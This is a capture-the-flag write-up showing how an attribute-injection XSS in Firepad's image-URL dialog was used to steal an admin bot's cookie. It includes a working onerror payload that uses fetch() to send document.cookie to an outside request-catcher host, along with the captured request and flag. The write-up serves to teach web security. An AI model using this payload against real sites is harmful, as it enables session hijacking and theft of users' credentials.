# Letter To The Editor

## Challenge Description
Old software, good software:
Clone and pwn: https://github.com/FirebaseExtended/firepad

## First Look
When we load the CTF website, we get this:
```
No admin running at the moment. Start (120s timeout)
```
Clicking start, we get
```
Your pad link: https://demo.firepad.io/#bClpaeyQXL
117s left
```

It brings us to a firepad website. When we are on the website, we notice 2 users that are viewing the pad. One is us, and the other is their admin bot. At this point I am guessing it will be some kind of XSS to steal the admin's cookie, so I start poking around on the website.

## Finding XSS Vulnerability

Eventually, I clicked on the image icon. It brings up a text dialog that says "Insert image url" with a submit button. I tried with a random image url to see what would happen. After submitting, I inspected the part of the page where the image was reflected to see how this shows up in the code. Nestled among many layers of divs, we see the image tag that was generated
```
<img src="https://en.wikipedia.org/wiki/PNG#/media/File:PNG_transparency_demonstration_1.png">
```

Cool, let's see if it is vulnerable to XSS. I submitted `" onerror="alert('xss');"`, and sure enough, an alert was generated!

## Solution

All that was left now was to submit a payload when the admin was logged in to steal their cookie. The payload I submitted was 
```
" onerror="fetch('https://joeyfirepad.requestcatcher.com/?cookie=' + document.cookie)
```

## Flag
The following request was received:
```
GET /?cookie=flag=GPNCTF{fun_w1th_0p3n_s0urc3};%20__utma=36539063.2045130622.1717441055.1717441055.1717441055.1;%20__utmc=36539063;%20__utmz=36539063.1717441055.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);%20__utmt=1;%20__utmb=36539063.1.10.1717441055
```